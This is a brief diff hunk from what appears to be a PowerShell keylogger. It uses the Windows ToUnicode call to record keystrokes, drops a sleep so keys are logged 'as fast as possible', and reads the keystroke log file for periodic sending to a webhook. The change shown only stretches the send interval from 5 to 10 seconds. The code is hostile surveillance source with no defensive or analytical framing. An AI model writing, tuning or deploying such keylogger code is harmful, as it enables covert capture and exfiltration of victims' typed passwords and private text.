@@ -38,7 +38,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
             # removed Start-Sleep to log keystrokes as fast as possible
 
             # check if 5 seconds have passed to send logs
-            if (((Get-Date) - $lastWebhookTime).TotalSeconds -ge 5) {
+            if (((Get-Date) - $lastWebhookTime).TotalSeconds -ge 10) {
                 try {
                     # read logs
                     $logs = Get-Content -Path $logFile -Raw -Encoding Unicode
